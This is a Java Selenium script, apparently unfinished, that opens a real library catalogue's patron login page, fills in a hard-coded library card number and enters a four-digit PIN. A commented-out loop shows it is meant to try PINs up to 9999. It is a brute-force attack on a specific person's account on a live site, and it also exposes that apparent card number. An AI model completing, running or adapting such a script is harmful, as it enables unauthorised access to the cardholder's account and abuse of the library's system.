package BruteForce;

import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

public class BruteForceB
{
	private WebDriver browser;
	
	private String usr;
	
	private int startingKey;
	
	private WebElement usrFld;
	private WebElement pswdFld;
	
	public BruteForceB(String username, int startingKey)
	{
		System.setProperty("webdriver.gecko.driver", "D:\\Data\\Dev\\ThirdParty\\Selenium\\Firefox\\geckodriver.exe");
		
		usr = username;
		this.startingKey = startingKey;
		
		browser = new FirefoxDriver();
		
		String url = "https://lmac.ent.sirsi.net/client/en_US/"
				+ "lmxac/search/patronlogin/http:$002f$002f"
				+ "lmac.ent.sirsi.net$002fclient$002fen_US"
				+ "$002flmxac$002fsearch$002faccount$003f/";
	
		browser.get(url);
		
		browser.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);
		
		usrFld = browser.findElement(By.xpath("//*[@id=\"j_username\"]"));
		
		browser.switchTo().parentFrame();
		
		//pswdFld = browser.findElement(By.xpath("//*[@id=\"j_password\"]"));
		
		WebDriverWait wait = new WebDriverWait(browser, 10);
		
		wait.until(ExpectedConditions.presenceOfElementLocated(By.xpath("//*[@id=\"j_password\"]")));
		wait.until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//*[@id=\"j_password\"]")));
		
		pswdFld = browser.findElement(By.xpath("//*[@id=\"j_password\"]"));
		
		try {Thread.sleep(5000);}catch(InterruptedException e) {}
		
		System.out.println("Check Point----------------------------");
		
		label://for (int i = startingKey; i < 9999; i++)
		{
			//login(i);
			login(startingKey);
		}
	}
	
	private void login(int key)
	{
		usrFld.sendKeys(usr);
		pswdFld.findElement(By.name("j_password")).sendKeys("" + key);
		
		//usrFld.submit();
	}
	
	public static void main(String[] args)
	{
		new BruteForceB("29304004001581", 9825);
	}
}
